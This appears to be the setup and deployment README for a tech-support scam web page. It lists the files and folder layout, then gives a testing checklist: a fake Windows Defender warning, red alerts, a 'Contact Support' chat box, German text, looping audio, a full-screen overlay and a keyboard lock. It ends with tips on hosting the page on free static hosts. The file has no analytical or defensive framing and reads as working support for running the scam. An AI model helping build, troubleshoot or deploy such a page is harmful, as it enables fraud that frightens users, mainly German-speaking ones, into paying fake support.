==============================================================================
           COPY & PASTE INSTRUCTIONS - Windows Security Warning Site
==============================================================================

REQUIRED FILES TO COPY (Must maintain exact folder structure):
--------------------------------------------------------------

Root Folder:
  ✓ index.html
  ✓ style.css
  ✓ chat-debug.css
  ✓ script.js
  ✓ chat-debug.js
  ✓ audio-ms.mp3

Subfolders (copy entire folders):
  ✓ audio/
      - 1.mp3
      - 2.mp3
      - 3.mp3
  
  ✓ icons/
      - windows.png
      - chrome.png
      - austria.png
      - germany.png
      - luxembourg.png
      - switzerland.png
  
  ✓ overlay/
      - o1.jpg
      - o2.jpg
      - o3.jpg
      - o4.jpg
      - o5.jpg
      - o6.jpg
      - o7.jpg
      - o8.jpg
      - o9.jpg
      - o10.jpg


FOLDER STRUCTURE (CRITICAL - Must look exactly like this):
-----------------------------------------------------------

YourNewFolder/
├── index.html
├── style.css
├── chat-debug.css
├── script.js
├── chat-debug.js
├── audio-ms.mp3
├── audio/
│   ├── 1.mp3
│   ├── 2.mp3
│   └── 3.mp3
├── icons/
│   ├── windows.png
│   ├── chrome.png
│   ├── austria.png
│   ├── germany.png
│   ├── luxembourg.png
│   └── switzerland.png
└── overlay/
    ├── o1.jpg
    ├── o2.jpg
    ├── o3.jpg
    ├── o4.jpg
    ├── o5.jpg
    ├── o6.jpg
    ├── o7.jpg
    ├── o8.jpg
    ├── o9.jpg
    └── o10.jpg


IMPORTANT NOTES:
----------------
1. ALL files must be in the SAME FOLDER as index.html
2. Do NOT create subfolders for CSS or JS files
3. The "audio", "icons", and "overlay" folders must be at the same level as index.html
4. File names are CASE-SENSITIVE (use exact names shown above)
5. All files use RELATIVE paths (no absolute paths like C:\ or /Users/)
6. The "audio" folder contains 3 MP3 files for chat system sounds


INTERNET CONNECTION REQUIRED:
------------------------------
The site needs internet to load:
  - jQuery library
  - Bootstrap CSS & JS
  - Font Awesome icons
  - Socket.IO (for chat functionality)


TESTING CHECKLIST:
------------------
After copying, verify:
  □ Open index.html in browser
  □ You see a random overlay image (full screen)
  □ Click anywhere - overlay disappears
  □ You see Windows desktop with icons (This PC, Documents, etc.)
  □ Blue Windows Defender warning box appears
  □ Red notifications appear in top-right corner
  □ Bottom-left shows Network Security Monitor
  □ Bottom-right shows Contact Support box
  □ Text is in German
  □ Audio plays in background (loop)


TROUBLESHOOTING:
----------------
If page is blank or broken:

1. CHECK CONSOLE (F12 in browser):
   - Look for red error messages
   - Note which files are "404 Not Found"

2. VERIFY FILE PATHS:
   Right-click page → View Page Source
   Check these lines are relative paths:
   - <link rel="stylesheet" href="style.css">
   - <link rel="stylesheet" href="chat-debug.css">
   - <script src="script.js"></script>
   - <script src="chat-debug.js"></script>

3. CHECK FILE NAMES:
   Ensure exact spelling (case-sensitive):
   - style.css (not Style.css or styles.css)
   - script.js (not Script.js or scripts.js)
   - icons folder (not Icons or icon)
   - overlay folder (not Overlay)

4. VERIFY FOLDER STRUCTURE:
   Make sure icons/ and overlay/ folders exist
   in the SAME directory as index.html

5. CHECK INTERNET CONNECTION:
   The site needs internet for external libraries


COMMON MISTAKES:
----------------
❌ Wrong: Creating a "css" folder and moving style.css there
✓  Right: Keep style.css in same folder as index.html

❌ Wrong: Renaming files (Style.css, SCRIPT.JS, etc.)
✓  Right: Use exact names: style.css, script.js

❌ Wrong: Copying only index.html
✓  Right: Copy ALL files and folders listed above

❌ Wrong: Forgetting the icons or overlay folders
✓  Right: Include both complete folders

❌ Wrong: Opening file:// directly without web server (for some features)
✓  Right: Use a local web server or just double-click index.html


BROWSER COMPATIBILITY:
----------------------
Tested and working on:
  ✓ Chrome/Edge (Recommended)
  ✓ Firefox
  ✓ Safari

Note: Some features (like keyboard lock) work best in Chrome/Edge


FOR WEB SERVER DEPLOYMENT:
---------------------------
Simply upload all files maintaining the folder structure.
No special server configuration needed.
Works on any static hosting (Netlify, Vercel, GitHub Pages, etc.)


==============================================================================
If you still have issues after checking above, note the specific error
message from browser console (F12) and the exact symptom.
==============================================================================

